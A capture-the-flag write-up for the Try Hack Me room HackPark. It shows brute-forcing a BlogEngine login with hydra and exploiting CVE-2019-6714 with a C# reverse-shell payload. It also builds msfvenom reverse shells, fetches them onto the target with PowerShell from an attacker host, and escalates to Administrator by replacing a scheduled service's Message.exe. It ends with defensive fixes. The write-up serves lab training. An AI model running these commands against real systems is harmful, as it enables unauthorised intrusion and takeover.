# Try Hack Me - HackPark

**Categories:** Windows, CVE20196714, RCE, Winpeas  
**Difficulty:** Medium  

Commands used in this guide use the exported variable $IP (`export IP=10.10.251.96`) in place of the target machine's IP address. 

This guide is for a Try Hack Me walkthrough room - it broadly follows the path of the walkthrough, but does not directly answer the task questions.

## 1: Enumeration - nmap, gobuster, searchsploit

Having launched the machine, we perform a basic service enumeration scan with nmap :

```console
┌──(kali㉿kali)-[~/Documents/tthm/hackpark]
└─$ sudo nmap -A -Pn -oN nmap.out $IP 
```

The scan shows and two open ports : 80 (Microsoft IIS httpd 8.5) and 3389 (ssl/ms-wbt-server, RDP) :

```console
...snip...
PORT     STATE SERVICE            VERSION
80/tcp   open  http               Microsoft IIS httpd 8.5
| http-methods: 
|_  Potentially risky methods: TRACE
| http-robots.txt: 6 disallowed entries 
| /Account/*.* /search /search.aspx /error404.aspx 
|_/archive /archive.aspx
|_http-server-header: Microsoft-IIS/8.5
|_http-title: hackpark | hackpark amusements
3389/tcp open  ssl/ms-wbt-server?
| ssl-cert: Subject: commonName=hackpark
| Not valid before: 2021-09-11T20:38:02
|_Not valid after:  2022-03-13T20:38:02
|_ssl-date: 2021-09-12T20:40:40+00:00; +1s from scanner time.
...snip...
```

Navigating to the application on 80 shows a basic blog platform, with a likely version number in the source :

```html
<!--- BlogEngine 3.3.6.0 -->
```

Searching the version with Searchsploit reveals a critical vulnerability ([CVE-2019-6714](https://nvd.nist.gov/vuln/detail/CVE-2019-6714)) that provides remote code execution : 

```console
┌──(kali㉿kali)-[~/Documents/tthm/hackpark]
└─$ searchsploit blogengine 3.3.6 
-------------------------------------------------------- ---------------------------------
 Exploit Title                                          |  Path
-------------------------------------------------------- ---------------------------------
BlogEngine.NET 3.3.6 - Directory Traversal / Remote Cod | aspx/webapps/46353.cs
BlogEngine.NET 3.3.6/3.3.7 - 'dirPath' Directory Traver | aspx/webapps/47010.py
BlogEngine.NET 3.3.6/3.3.7 - 'path' Directory Traversal | aspx/webapps/47035.py
BlogEngine.NET 3.3.6/3.3.7 - 'theme Cookie' Directory T | aspx/webapps/47011.py
BlogEngine.NET 3.3.6/3.3.7 - XML External Entity Inject | aspx/webapps/47014.py
-------------------------------------------------------- ---------------------------------
```

```console
┌──(kali㉿kali)-[~/Documents/tthm/hackpark]
└─$ cat `locate aspx/webapps/46353.cs`
# Exploit Title: BlogEngine.NET <= 3.3.6 Directory Traversal RCE
...snip...
# Version: <= 3.3.6
# Tested on: Windows 2016 Standard / IIS 10.0
# CVE : CVE-2019-6714

/*
 * CVE-2019-6714
 *
 * Path traversal vulnerability leading to remote code execution.  This
 * vulnerability affects BlogEngine.NET versions 3.3.6 and below. 
...snip...
```

The vulnerability is based on a faulty implementation of a theme override feature in BlogEngine versions <= 3.3.6. A theme can be overridden by providing an arbitrary path to the `?theme` query parameter ; if an attacker has the authorization required to upload an appropriately wrapped payload to the BlogEngine dashboard, a known path can be provided to `?theme` to execute the payload.

As the vulnerability requires authorization to upload the payload, we perform a gobuster scan using dirbuster's common.txt word list to find a login page, admin dashboard, etc : 

```console
┌──(kali㉿kali)-[~/Documents/tthm/hackpark]
└─$ gobuster dir -u $IP -w /usr/share/dirb/wordlists/common.txt -o gobuster.out
...snip...
===============================================================
/account              (Status: 301) [Size: 152] [--> http://10.10.172.214/account/]
/admin                (Status: 302) [Size: 173] [--> http://10.10.172.214/Account/login.aspx?ReturnURL=/admin]
/Admin                (Status: 302) [Size: 173] [--> http://10.10.172.214/Account/login.aspx?ReturnURL=/Admin]
/ADMIN                (Status: 302) [Size: 173] [--> http://10.10.172.214/Account/login.aspx?ReturnURL=/ADMIN]
...snip...
```

Navigating to `/Account/login.aspx` reveals a BlogEngine Account Login page.

## 2. Login bruteforce - hydra

While the gobuster scan revealed a number of other endpoints, none of these endpoints provided information on possible credentials. [BlogEngine's docs](https://blogengine.io/support/get-started/) give default credentials of `admin:admin`, but this does not work on the login page. We will gamble that the user changed the password but not the username, and attempt to bruteforce the password using hydra and the rockyou wordlist. To prepare the attack, we capture the body of the POST request made by the login form (you can do this in Burpsuite or any other proxy, but it's easiest just to copy it from the networking tab in devtools) :

```
__VIEWSTATE=quA%2BfixjnRZyooqN5mdBRNxn8Q0HJRLI%2Fme3ncga7GYibs1Kn82djcxVUC0xVctAp%2Bx96ueEBMjabvAbIEUXPZCnUOEiFyTjvTRobFro47FcvDnyxiDfD%2Bll5WgMv1T9rfWmf3NURxEIbuuXWeJB2PH35lQjFkxO3cxzWBih%2F3lYuSp3&__EVENTVALIDATION=sk%2BPFMIkK%2BETkL%2BXh%2FGhKa3D%2BGrGyaSjxQsCF2f0J6YvwZ1VaalcDJWgNOVFvnOjSuwxqzI%2BrapYubD%2BEaSqvhGEAUyGUrA%2FYI1ySSQCw2HKXKSi%2B2AJVSaubqI5ysoa%2BzbYS4pzr5j%2FKOumyhiLkaghWeJV6Pku%2Ftwc2flhEajZ%2B6%2F0&ctl00%24MainContent%24LoginUser%24UserName=admin&ctl00%24MainContent%24LoginUser%24Password=main&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in
```

which we then adapt to the hydra http-post-form syntax :

```console
┌──(kali㉿kali)-[~/Documents/tthm/hackpark]
└─$ hydra -l admin -P rockyou $IP  http-post-form  "/Account/login.aspx:__VIEWSTATE=quA%2BfixjnRZyooqN5mdBRNxn8Q0HJRLI%2Fme3ncga7GYibs1Kn82djcxVUC0xVctAp%2Bx96ueEBMjabvAbIEUXPZCnUOEiFyTjvTRobFro47FcvDnyxiDfD%2Bll5WgMv1T9rfWmf3NURxEIbuuXWeJB2PH35lQjFkxO3cxzWBih%2F3lYuSp3&__EVENTVALIDATION=sk%2BPFMIkK%2BETkL%2BXh%2FGhKa3D%2BGrGyaSjxQsCF2f0J6YvwZ1VaalcDJWgNOVFvnOjSuwxqzI%2BrapYubD%2BEaSqvhGEAUyGUrA%2FYI1ySSQCw2HKXKSi%2B2AJVSaubqI5ysoa%2BzbYS4pzr5j%2FKOumyhiLkaghWeJV6Pku%2Ftwc2flhEajZ%2B6%2F0&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:F=failed"
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
...snip...
[80][http-post-form] host: 10.10.172.214   login: admin   password: PASSWORD
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-09-13 21:52:34
```
We use the discovered password to connect to the BlogEngine admin dashboard, and Navigate to ABOUT in the menu on the right to confirm the vulnerable BlogEngine version :

```html
...snip...
    <div class="panel-heading">
                <div class="panel-title">Your BlogEngine.NET Specification</div>
            </div>
            <ul class="list-group">
                <li class="list-group-item">
                    <span> Version:</span> 3.3.6.0
...snip...
```

## 3. Foothold : CVE-2019-6714

The `aspx/webapps/46353.cs` file provided by Searchsploit provides a basic guide to performing the exploit, as well as aspx/C# shellcode to use as a payload. Copy this file to your working directory and rename it `PostView.aspx`, replacing the arguments passed to `System.Net.Sockets.TcpClient` with the IP and port of your attack machine : 

```console
┌──(kali㉿kali)-[~/Documents/tthm/hackpark]
└─$ head PostView.ascx        
<%@ Control Language="C#" AutoEventWireup="true" EnableViewState="false" Inherits="BlogEngine.Core.Web.Controls.PostViewBase" %>
<%@ Import Namespace="BlogEngine.Core" %>

<script runat="server">
        static System.IO.StreamWriter streamWriter;

    protected override void OnLoad(EventArgs e) {
        base.OnLoad(e);

        using(System.Net.Sockets.TcpClient client = new System.Net.Sockets.TcpClient("ATTACK_IP", ATTACK_PORT)) {
```

To automate the exploit, we prepare a simplified version of [Aaron Bishop's CVE-2019-10719 exploit script](https://github.com/irbishop/CVEs/blob/master/2019-10719/exploit.py) adapted for the HackPark room. [The script is provided in full alongside this guide](./hackpark_exploit.py), but you should configure the IP and PWORD variables before running it. Having copied the script onto your attack machine, start a nc listener to capture the reverse shell and run the script in the same directory as your `PostView.ascx` payload. After a few seconds, the shell will connect : 

```console
┌──(kali㉿kali)-[~/Documents/tthm/hackpark]
└─$ nc -lvnp 1337
listening on [any] 1337 ...
connect to [ATTACK_IP] from (UNKNOWN) [10.10.172.214] 49366
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.
whoami
c:\windows\system32\inetsrv>whoami
iis apppool\blog
```

## 3. Shell upgrade - msfvenom

The shell provided by the exploit is pretty dismal, so we're going to replace it with an alternative from msfvenom. Let's get through this quickly : 

1. Generate a new reverse shell payload in .exe format (`msfvenom -p windows/shell_reverse_tcp LHOST=ATTACK-IP LPORT=5555 -f exe > upgrade.exe`)
2. Host the payload from the attack machine (`sudo python3 -m http.server`)
3. Download the payload to a writable directory on the target (`C:\Windows\Temp`) from the current shell session (`powershell -c "Invoke-WebRequest -Uri 'ATTACK_IP/upgrade.exe' -OutFile '.\upgrade.exe'" `)
4. Start a nc listener on the attack machine (`nc -lvnp 5555`)
5. Run the payload on the target (`.\upgrade.exe`)

The resulting shell will have more stable output and error reporting than our initial shell. Why didn't we just send a more stable shell in the initial payload? Reader, I tried - see section 5.

## 4. Privesc : winpeas, writeable service directory

Our current iis apppool user does not have access to the user directories at `C:\Windows\Users\jeff` and `C:\Windows\Users\Administrator`. We will use winpeas to identify options for privesc - download the [winpeas executable](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS/winPEASexe) to your attack machine, host it on HTTP, download to a writable directory on the target machine and run it. Scrolling through the results, we find a possible .dll hijacking vulnerability on a [third-party scheduler service](https://www.splinterware.com/products/scheduler.html) :

```console
...snip...
    WindowsScheduler(Splinterware Software Solutions - System Scheduler Service)[C:\PROGRA~2\SYSTEM~1\WService.exe] - Auto - Running
    File Permissions: Everyone [WriteData/CreateFiles]
    Possible DLL Hijacking in binary folder: C:\Program Files (x86)\SystemScheduler (Everyone [WriteData/CreateFiles])
    System Scheduler Service Wrapper
...snip...
```

The key feature here is the writable directory at `C:\Program Files (x86)\SystemScheduler`  - in a typical .dll hijacking attack, we would identify the .dll files imported by the `WService.exe` binary, replace them in the binary's parent directory with malicious .dll files of the same, and force a service restart. But this needs more than a writable directory - we need to identify the .dll files loaded by the binary, and have the appropriate permissions to restart the service (a box reboot is not an option in the CTF context). Running `tasklist /m /fi "imagename eq WService.exe"` ([microsoft docs](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/tasklist)) shows no .dll files loaded by the `WService.exe` binary : 

```console
C:\Windows\Temp>tasklist /m /fi "imagename eq WService.exe"
tasklist /m /fi "imagename eq WService.exe"

Image Name                     PID Modules
========================= ======== ============================================
WService.exe                  1400 N/A 
```

and the iis apppool\blog user does not have the permissions required to restart (stop / start) the service :

```console
C:\Windows\Temp>net start WindowsScheduler
net start WindowsScheduler
System error 5 has occurred.

Access is denied.
```

Further manual enumeration gives us additional options for exploiting this writable directory. The `./Events/` directory contains a `20198415519.INI_LOG.txt` file that logs the creation of a new process from `./Message.exe` every 30 seconds : 

```console
C:\Program Files (x86)\SystemScheduler\Events>20198415519.INI_LOG.txt
...snip...
09/17/21 08:56:01,Event Started Ok, (Administrator)
09/17/21 08:56:34,Process Ended. PID:3440,ExitCode:4,Message.exe (Administrator)
09/17/21 08:57:01,Event Started Ok, (Administrator)
09/17/21 08:57:33,Process Ended. PID:820,ExitCode:4,Message.exe (Administrator)
09/17/21 08:58:00,Event Started Ok, (Administrator)
09/17/21 08:58:33,Process Ended. PID:2436,ExitCode:4,Message.exe (Administrator)
09/17/21 08:59:01,Event Started Ok, (Administrator)
09/17/21 08:59:33,Process Ended. PID:3648,ExitCode:4,Message.exe (Administrator)
09/17/21 09:00:01,Event Started Ok, (Administrator)
```

`Message.exe` is in a writable location and is executed periodically by a service running as Administrator - replacing it with a .exe reverse shell should provide us with an Administrator session :

1. Create a new .exe payload named `Message.exe` with msfvenom (this is required because the target port is hardcoded in the binary - we can't just reuse the previously created shell : `msfvenom -p windows/shell_reverse_tcp LHOST=ATTACK-IP LPORT=6666 -f exe > Message.exe`)
2. Host the payload on HTTP on the attack machine (`python3 -m http.server 80`) and start a netcat listener (`nc -lvnp 6666`)
3. Rename the existing `Message.exe` on the target machine (the permissions don't allow a direct overwrite of the file: `move Message.exe Message.original`)
4. Download the malicious `Message.exe` to the target machine (`powershell -c "Invoke-WebRequest -Uri 'ATTACK_IP/Message.exe' -OutFile '.\Message.exe'"`)

After thirty seconds or so, the service executes the `Message.exe` payload and the shell connects : 

```console
┌──(kali㉿kali)-[~/Documents/tthm/hackpark]
└─$ nc -lvnp 6666
listening on [any] 6666 ...
connect to [ATTACK-IP] from (UNKNOWN) [10.10.251.96] 49238
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\PROGRA~2\SYSTEM~1>echo %username%
echo %username%
Administrator
```

The user flag is at `C:\Users\jeff\Desktop\user.txt`. The root flag is at `C:\Users\Administrator\Desktop\root.txt`.

## 5. Bonus : shell upgrade skip, rdp dead end, System Scheduler CVE

* We should be able to upload an arbitrary payload during the initial exploit, skipping the shell upgrade step. For whatever reason, my attemps at wrapping an asp / aspx / aspx-exe / C# msfvenom payload in the BlogEngine .aspx template provided in `aspx/webapps/46353.cs` never worked out - in some cases I was able to catch the reverse shell connection in metasploit, but the session died immediately. This should be doable relatively easily, but I don't know enough .NET / C# to find whatever the errror is. 
* Our original nmap scan found an RDP server on the machine that wasn't required during the exploit. I wasn't able to connect with the known user/credential pairs, but I didn't try to brute force the login - this may be a red herring intended to make the box more realistic, or a testing artefact.
* A [recent CVE highlights the same directory permissions misconfiguration](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-31771) in the most recent version of SystemScheduler - the CVE ID was attributed in March 2021, and the latest update to the SystemScheduler site was made in January 2021...

## 6. Summary and Solutions

* **Password Policy** : The admin access required to perform the exploit relied on a bruteforceable password. Enforcing minimum entropy password policies would prevent realistic bruteforcing - if your users respect them...
* **Unlimited failed logins** : Password bruteforcing relies on making an unlimited number of failed login requests ; after a certain number of failed login attemps, subsequent attempts from the same IP should be blocked for a certain period. 
* **Known vulnerabilities** : The BlogEngine CVE was published in March 2019 - at this point, the vulnerability in 3.3.6 has been known for over 2 years. Unfortunately, the [News section of BlogEngine's own website](https://blogengine.io/news/) has no mention of the vulnerability or the criticality of the 3.3.6 -> 3.3.7 upgdrade. Threat intelligence is key here - if a critical vulnerability was found in a technology in your stack, how would you find about it?
* **Auditing of third-party software** : Whilst the SystemScheduler CVE was only published recently, the vulnerability is not particularly difficult to discover. Sometimes we will need third-party software to run with elevated privileges, but in these situations we should take a more proactive approach to software auditing and vulnerability detection. This doesn't have to mean decompiling every binary bundled with the application - in this case, running a vulnerability scanner on the host following the installtion of SystemScheduler would have found the vulnerability.
